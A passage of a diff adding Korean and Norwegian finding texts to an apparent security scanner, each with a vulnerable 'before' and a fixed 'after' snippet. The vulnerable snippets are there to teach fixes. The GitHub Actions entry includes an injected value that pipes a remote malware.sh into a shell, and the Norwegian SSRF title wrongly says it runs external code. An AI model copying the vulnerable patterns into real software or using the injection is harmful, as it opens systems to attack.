+      "콘텐츠가 일반 텍스트가 아니라 원시 HTML(dangerouslySetInnerHTML, v-html, .innerHTML)로 페이지에 삽입됩니다. 그 콘텐츠에 사용자 입력이 포함되어 있다면, 페이지를 읽는 사람의 브라우저에서 실행되는 스크립트를 담고 있을 수 있습니다.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// 또는 HTML이 필요하다면: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "업로드된 파일 공간이 누구에게나 공개되어 있습니다",
+    description:
+      "스토리지 버킷(Supabase Storage, S3)이 공개로 설정되어 있습니다. 사용자가 업로드한 문서, 사진, 파일이 들어 있다면, 경로를 아는 — 또는 추측하는 — 누구나 인증 없이 접근할 수 있습니다.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// 시간 제한이 있는 서명된 URL로 파일을 제공하세요: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "링크 하나만으로 데이터를 삭제하거나 변경할 수 있습니다",
+    description:
+      "GET 라우트가 데이터를 변경하는 작업을 수행합니다(경로에 delete/remove/update/edit가 포함됨). GET 요청은 링크를 방문하거나 외부 사이트에서 이미지를 불러오는 것만으로도 실행됩니다 — CSRF 공격의 전형적인 발판입니다.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "브라우저에 저장된 로그인 데이터가 잘 보호되지 않습니다",
+    description:
+      "액세스 토큰이 localStorage에 저장됩니다. httpOnly 쿠키와 달리, 페이지에서 실행되는 모든 스크립트(XSS로 주입된 악성 스크립트 포함)가 이를 읽고 탈취할 수 있습니다.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// 서버에서 토큰을 httpOnly 쿠키로 설정하세요:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "사이트가 사기 웹사이트로의 리디렉션에 악용될 수 있습니다",
+    description:
+      "사이트가 알려진 도메인인지 확인하지 않고 요청(query, body, params)에서 직접 가져온 주소로 사용자를 리디렉션합니다. 당신의 사이트를 가리키는 것처럼 보이는 링크가 실제로는 피싱 페이지로 이어질 수 있습니다.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "주소의 숫자를 바꾸면 다른 사람의 데이터가 보일 수 있습니다",
+    description:
+      "데이터베이스 쿼리가 요청하는 사용자에게 속하는지 인근 코드에서 확인하지 않고 URL(req.params.id)에서 가져온 식별자를 직접 사용합니다. 주소의 id를 바꾸면 다른 사용자의 데이터에 접근할 수 있습니다 — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "요청 값이 HTTP 응답 헤더에 직접 들어갑니다",
+    description:
+      "HTTP 응답 헤더가 줄바꿈(CRLF) 포함 여부를 확인하지 않고 요청(query, body, params)에서 직접 가져온 값으로 설정됩니다. 공격자는 추가 헤더나 완전히 다른 응답을 삽입할 수 있습니다 — response splitting — 캐시, 쿠키, 또는 다른 사용자에게 보이는 콘텐츠를 조작할 수 있습니다.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile이 non-root 사용자를 설정하지 않습니다",
+    description:
+      "Dockerfile에 USER 명령이 없습니다: 설정하지 않으면 컨테이너가 root로 실행됩니다. 공격자가 컨테이너 안에서 코드를 실행하는 데 성공하면(예: 취약한 라이브러리를 악용하여), 컨테이너 안의 root 권한은 호스트로의 탈출이나 주변 시스템에 대한 더 넓은 영향을 더 쉽게 만듭니다.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes 매니페스트가 non-root 사용자로 실행되도록 명시적으로 강제하지 않습니다",
+    description:
+      '매니페스트 어디에도(pod 수준이든 컨테이너 수준이든) "runAsNonRoot"가 없습니다: 설정하지 않으면 컨테이너는 이미지가 정의한 사용자로 실행됩니다 — 이미지 자체가 바꾸지 않았다면 흔히 기본값은 root입니다. 이를 명시적으로 true로 설정하면, 사고가 발생한 후에야 알게 되는 대신 이미지가 여전히 root로 실행하려 할 때 pod 시작이 실패하게 만듭니다.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "CI의 서드파티 액션이 정확한 버전(커밋 SHA)에 고정되어 있지 않습니다",
+    description:
+      '워크플로가 커밋 SHA가 아니라 태그나 브랜치(예: "@v1", "@main")로 참조되는 서드파티 액션을 사용합니다. 이를 유지관리하는 사람 — 또는 그 계정을 침해한 사람 — 은 언제든 그 참조를 다른 커밋으로 옮겨서, 해당 시크릿에 접근한 채로 CI에서 실행되는 내용을 조용히 바꿀 수 있습니다. 커밋 SHA는 항상 정확히 같은 코드를 가리킵니다.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, 커밋 SHA에 고정됨 — 버전을 업데이트할 때 SHA도 업데이트하세요`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "워크플로가 실제로 사용하는 권한뿐 아니라 토큰의 모든 권한을 스스로에게 부여합니다",
+    description:
+      '"permissions: write-all"은 워크플로가 그중 일부만 사용하더라도 워크플로의 GITHUB_TOKEN에 issue, pull request, 패키지, 배포 등 모든 것에 대한 쓰기 접근 권한을 부여합니다. 워크플로의 한 단계가 침해되면(악성 의존성, 주입된 스크립트), 그 더 넓은 권한은 공격자가 할 수 있는 일을 늘립니다.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # 워크플로가 실제로 사용하는 권한만`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "세션 또는 인증 쿠키가 Secure와 HttpOnly 플래그 없이 설정되어 있습니다",
+    description:
+      '세션/인증/토큰과 비슷한 이름의 쿠키가 옵션에 "httpOnly"와 "secure" 없이 설정되어 있습니다. httpOnly가 없으면 페이지의 JavaScript — XSS로 주입된 코드 포함 — 가 그 쿠키를 읽을 수 있습니다. secure가 없으면 암호화되지 않은 HTTP 연결로도 전송될 수 있습니다.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "로그인 폼이 연속된 과도한 시도를 차단하지 않습니다",
+    description:
+      "파일에 로그인 라우트가 정의되어 있지만, 같은 파일에 rate-limiting 미들웨어의 흔적이 전혀 없습니다. 시도 횟수 제한이 없으면 공격자는 지연 없이 순차적으로 비밀번호를 시도할 수 있습니다(brute force).",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "비밀번호나 민감한 데이터가 로그에 남습니다",
+    description:
+      "console.log(또는 유사한 함수) 호출에 password, token, secret, apiKey라는 이름의 변수가 포함되어 있습니다. 이 로그가 외부 서비스나 파일로 전달되면, 민감한 데이터가 필요 이상으로 오래 노출된 채로 남습니다.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfile의 기본 이미지가 ":latest" 태그를 사용합니다',
+    description:
+      'FROM 명령이 정확한 버전 대신 ":latest" 태그를 명시적으로 사용합니다. "latest"는 시간이 지나면서 바뀝니다: 다른 시점에 다시 실행한 동일한 빌드가 기본 이미지의 다른 버전을 받을 수 있습니다 — 재현 불가능한 빌드이며, 아무도 결정하지 않은 원치 않는 업데이트가 들어올 수 있습니다.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile이 COPY 대신 ADD로 원격 파일을 다운로드합니다",
+    description:
+      "http/https URL을 가진 ADD 명령은 빌드 중에 무결성 검증 없이, 저장소에서 보이지 않는 콘텐츠로 인터넷에서 파일을 다운로드합니다. 그 URL이 나중에 침해되면, Dockerfile을 읽는 것만으로는 아무도 눈치채지 못한 채 빌드가 임의의 콘텐츠를 가져오게 됩니다.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<예상 해시>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "취약한 의존성:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "아직 알려진 수정 버전이 없습니다 — 대체 패키지를 검토하거나 프로젝트의 업데이트를 지켜보세요."
+      ),
+    },
+  }),
+},
+  nb: {
+  "supabase-service-role-in-client": {
+    title: "Supabase sin hemmelige nøkkel havner i en fil beregnet på nettleseren",
+    description:
+      "En variabel med et offentlig prefiks (f.eks. NEXT_PUBLIC_, VITE_) eller en klientsidefil refererer til Supabase sin service role-nøkkel. Denne nøkkelen omgår Row Level Security: havner den i nettleserens bundle, kan hvem som helst lese den og opptre som databaseadministrator.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (kun server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "Passord eller hemmelige nøkler er skrevet direkte i koden",
+    description:
+      "En API-nøkkel, et token eller et passord ser ut til å være skrevet som en bokstavelig verdi i stedet for lest fra en miljøvariabel. Alle som leser kildekoden (eller repositoriet, hvis offentlig) får tak i den hemmeligheten.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "En fil med prosjektets ekte passord er blant dem som analyseres",
+    description:
+      "En .env-fil med ekte verdier (ikke en .env.example) er inkludert i analysen. Havner denne filen i et repositorium eller en offentlig driftsetting, blir alle legitimasjonsopplysningene den inneholder eksponert.",
+    fix: {
+      before: `# .env (committet ved en feil)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (committet)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env holdes utenfor repoet (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Hvem som helst kan lese eller endre alle brukeres data",
+    description:
+      "Row Level Security er deaktivert, eller en policy tillater tilgang for alle (USING (true)) uten å sjekke hvem som gjør forespørselen. Enhver autentisert bruker — eller til og med en anonym — kan lese eller endre alle andres data.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "En verdi brukeren har skrevet inn limes direkte inn i en databasespørring",
+    description:
+      "En SQL-spørring bygges ved å sette sammen eller interpolere en streng direkte i stedet for å bruke parametere. Kommer den teksten (selv indirekte) fra en bruker, kan den endre selve spørringen — SQL-injeksjon.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Passordene ser ikke ut til å være beskyttet",
+    description:
+      "Et passordfelt lagres nøyaktig slik det kom inn i forespørselen, og ingen hash-funksjon (bcrypt, argon2, scrypt) finnes i filen. Blir databasen kompromittert, er alle passord umiddelbart brukbare.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Hemmeligheten brukt til å signere innlogginger er skrevet i klartekst i koden",
+    description:
+      "Hemmeligheten som sendes til jwt.sign / jwt.verify (eller variabelen JWT_SECRET) er en bokstavelig verdi i koden i stedet for å komme fra en miljøvariabel. Alle som leser den kan lage gyldige tilgangstokener for enhver bruker.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Serveren kan tvinges til å kjøre eksterne kommandoer",
+    description:
+      "En funksjon som kjører systemkommandoer (exec, execSync, spawn) mottar en streng bygget ved interpolering eller sammensetting. Kommer en del av denne strengen fra brukerinput, kan den som kontrollerer den kjøre vilkårlige kommandoer på serveren.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "En fil på serveren kan leses eller skrives ved å velge stien utenfra",
+    description:
+      "En funksjon som leser, skriver eller sender en fil henter stien direkte fra en verdi i forespørselen (query, body, params) uten å sjekke at den holder seg innenfor en tillatt mappe. En angriper kan sette inn «../» for å komme ut av den tiltenkte mappen og lese eller overskrive vilkårlige filer på serveren (f.eks. en konfigurasjonsfil med legitimasjon).",
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sti ikke tillatt")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "En verdi brukeren har skrevet inn kjøres som kode inne i en MongoDB-spørring",
+    description:
+      "MongoDBs $where-operator kjører JavaScript på serversiden for hvert dokument — er den strengen bygget ved å sette sammen en verdi som kommer fra brukeren, kan den som kontrollerer den få vilkårlig kode til å kjøre i databasens kontekst, ikke bare endre filteret som med en vanlig SQL-injeksjon.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "En verdi brukeren har skrevet inn tolkes som en mal, ikke som data",
+    description:
+      "En funksjon som kompilerer/kjører en mal mottar HELE malen fra en verdi i forespørselen, i stedet for å bruke en fast mal og bare sende dataene. En angriper kan skrive direkte i malmotorens syntaks (f.eks. {{7*7}} for Jinja2) og kjøre kode på serveren — Server-Side Template Injection, som ofte fører til kjøring av vilkårlige kommandoer, ikke bare et visningsproblem som XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML-parseren kan tvinges til å lese filer eller gjøre eksterne forespørsler",
+    description:
+      "En XML-parser (DocumentBuilderFactory) opprettes uten eksplisitt å deaktivere eksterne entiteter (DOCTYPE) i de nærmeste linjene. Mottar parseren XML fra en kilde den ikke kan stole på, kan en angriper definere en ekstern entitet for å lese filer på serveren eller få den til å kontakte en adresse etter eget valg — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "En hemmelighet er skrevet direkte i en ENV- eller ARG-instruksjon i Dockerfilen",
+    description:
+      "En variabel med et navn som password/secret/token/key har en bokstavelig verdi i en ENV- eller ARG-instruksjon. I motsetning til en .env-fil (som normalt ikke havner i bildet), bakes denne verdien inn i selve Docker-bildet — alle som kan hente det eller inspisere lag-historikken kan gjenopprette den, selv om linjen fjernes i en senere versjon av Dockerfilen.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# sendes med: docker build --build-arg DB_PASSWORD=*** (eller, enda bedre,\n# en BuildKit secret mount, som aldri havner i lag-historikken)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "En container i Kubernetes-manifestet kjører som privilegert",
+    description:
+      '"privileged: true" i en containers securityContext deaktiverer nesten all vanlig isolasjon mellom container og vert: containeren får tilgang til vertens enheter, kan endre nettverkskonfigurasjonen, og i mange tilfeller få effektiv root-tilgang til maskinen den kjører på. Nesten aldri nødvendig for en vanlig app.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # kun de capabilities som faktisk trengs`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "En hemmelighet er skrevet i klartekst i en miljøvariabel i et Kubernetes-manifest",
+    description:
+      'En miljøvariabel med et navn som password/secret/token/key har en bokstavelig verdi ("value:") i stedet for å bli lest fra en Secret ("valueFrom.secretKeyRef"). Selve manifestet — ofte committet til et repositorium — inneholder dermed hemmeligheten i klartekst, synlig selv for noen som bare kan lese konfigurasjonen, ikke nødvendigvis kjøre kommandoer i klyngen.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "En Terraform security group åpner en sensitiv port mot hele internett",
+    description:
+      'En regel med "cidr_blocks" som inkluderer 0.0.0.0/0 (alle IP-adresser) ligger nær en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # kun ditt private nettverk, eller en bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "En Google Cloud-brannmurregel åpner en sensitiv port mot hele internett",
+    description:
+      'En "google_compute_firewall"-ressurs med "source_ranges" som inkluderer 0.0.0.0/0 (alle IP-adresser) tillater trafikk til en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # kun ditt private nettverk, eller en bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "En Azure-nettverksregel åpner en sensitiv port mot hele internett",
+    description:
+      'En network security rule ("azurerm_network_security_rule", eller en "security_rule"-blokk inne i "azurerm_network_security_group") med "source_address_prefix" satt til "*" eller "0.0.0.0/0", retning "Inbound" og tilgang "Allow", nær en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport. Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # kun ditt private nettverk, eller en bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "En hemmelighet er skrevet som standardverdi for en Terraform-variabel",
+    description:
+      'En variabel med et navn som password/secret/token/key har en bokstavelig verdi i sin "default". I motsetning til en verdi som sendes ved kjøretid (tfvars, miljøvariabler TF_VAR_*), havner en default i kildekoden — og er repositoriet delt eller offentlig, ser alle den, selv uten tilgang til Terraform-tilstanden.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # ingen default: send den med en .tfvars-fil (utenfor git) eller en miljøvariabel TF_VAR_db_password\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "En verdi kontrollert av en ekstern bruker går rett inn i en shell-kommando i CI",
+    description:
+      'En "run:"-kommando i en GitHub Actions-workflow interpolerer direkte en verdi som en pull request-tittel, et branch-navn eller teksten i en kommentar — alt skrivbart av hvem som helst som åpner en pull request eller kommentar, selv fra en ekstern fork. En verdi som `"; curl malware.sh | sh #` ville kjørt vilkårlige kommandoer i CI-en, med tilgang til alle hemmeligheter tilgjengelige i den workflowen.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # sendt som miljøvariabel, aldri interpolert direkte i kommandoen`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflowen kjører koden fra en ekstern pull request med tilgang til repositoriets hemmeligheter",
+    description:
+      'Workflowen bruker "pull_request_target" — som kjører med basisrepositoriets tillatelser og hemmeligheter selv for en pull request åpnet fra en ukjent fork — og gjør checkout av selve pull requestens kode ("github.event.pull_request.head"), ikke basisbranchen. Den som åpner pull requesten får dermed i praksis sin egen kode kjørt med tilgang til disse hemmelighetene.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Gjør checkout av basisbranchen, ikke PR-ens kode — eller bruk\n      # "pull_request" i stedet for "pull_request_target" hvis du ikke trenger\n      # de bredere tillatelsene/hemmelighetene.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Data fra forespørselen deserialiseres med et format som kan kjøre kode",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) eller biblioteket node-serialize (Node) deserialiserer en verdi hentet direkte fra forespørselen. I motsetning til JSON kan disse formatene representere og kjøre kode under selve deserialiseringen — den som kontrollerer verdien som sendes kan oppnå vilkårlig kodekjøring på serveren.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON kjører aldri kode under parsing, i motsetning til pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Koden godtar eksplisitt usignerte JWT-tokener (algoritme "none")',
+    description:
+      '"none" finnes blant algoritmene som godtas for å verifisere et JWT-token. Et token med algoritmen "none" har ingen signatur å verifisere: hvem som helst kan bygge ett med hvilket som helst innhold (f.eks. en admin-rolle), og koden ville godtatt det som gyldig.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkluder aldri "none" blant de godtatte algoritmene`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "En ny tabell ser ut til å bli opprettet uten beskyttelse",
+    description:
+      "En SQL-migrering oppretter en tabell, men aktiverer ikke Row Level Security for akkurat den tabellen i samme fil. Så lenge det forblir slik, starter tabellen uten noen begrensning på hvem som kan lese eller skrive til den.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Nettstedet godtar forespørsler fra alle andre nettsteder",
+    description:
+      "CORS-headeren er satt til å godta forespørsler fra alle origin (*), eller cors()-middlewaren brukes uten begrensninger. Ethvert tredjeparts nettsted kan kalle API-ene dine fra nettleseren til en allerede autentisert bruker.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "En funksjon med adminrettigheter sjekker ikke hvem som bruker den",
+    description:
+      "En rute eller funksjon hvis navn tyder på adminoperasjoner inneholder ingen autentiserings- eller rollesjekk i de nærmeste linjene. Hvem som helst som kjenner URL-en kan kjøre den.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Nettstedet kan tvinges til å kjøre ekstern kode",
+    description:
+      "En utgående HTTP-forespørsel (fetch, axios) bruker direkte en verdi fra en brukers forespørsel som mål-URL. En ondsinnet bruker kan få serveren din til å kalle interne eller vilkårlige adresser — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Passordene beskyttes med en metode som nå er lett å knekke",
+    description:
+      "På samme linje brukes md5() eller sha1() på en verdi knyttet til et passord. Disse algoritmene er for raske å beregne: en angriper med databasen kan prøve milliarder av passord i sekundet.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "En container i Kubernetes-manifestet er satt til å kjøre som root",
+    description:
+      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvinger eksplisitt containeren til å kjøre som root. Klarer en angriper å kjøre kode inne i containeren (f.eks. ved å utnytte et sårbart bibliotek), gjør root-tilgang inne i containeren en eskalering til verten — eller en bredere konsekvens — enklere.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "En container i Kubernetes-manifestet kan få flere privilegier enn den startet med",
+    description:
+      '"allowPrivilegeEscalation: true" i securityContext lar en prosess inne i containeren få flere privilegier enn prosessen som startet den (f.eks. via en setuid-binærfil). Kombinert med en sårbarhet i applikasjonen er det ett steg nærmere å kjøre kode med flere privilegier enn tiltenkt.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "En pod i Kubernetes-manifestet deler vertens nettverk, prosesser eller delte minne",
+    description:
+      '"hostNetwork", "hostPID" eller "hostIPC" satt til true tar poden ut av sin normale isolasjon: hostNetwork eksponerer poden på vertens nettverk (og omgår klyngens nettverkspolicyer), hostPID gir den innsyn i alle prosesser på vertsmaskinen, hostIPC gir den tilgang til vertens delte minne. Nesten aldri nødvendig for en vanlig app — typisk kun for lavnivå system-/overvåkingsverktøy.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access er deaktivert på en S3-bucket definert i Terraform",
+    description:
+      'Én eller flere av de fire beskyttelsene i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) er satt til false. Det betyr ikke at bucketen allerede er offentlig, men det fjerner et sikkerhetsnett som ville forhindret at den gjøres offentlig ved en feil i fremtiden.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "En IAM-policy definert i Terraform gir full tilgang",
+    description:
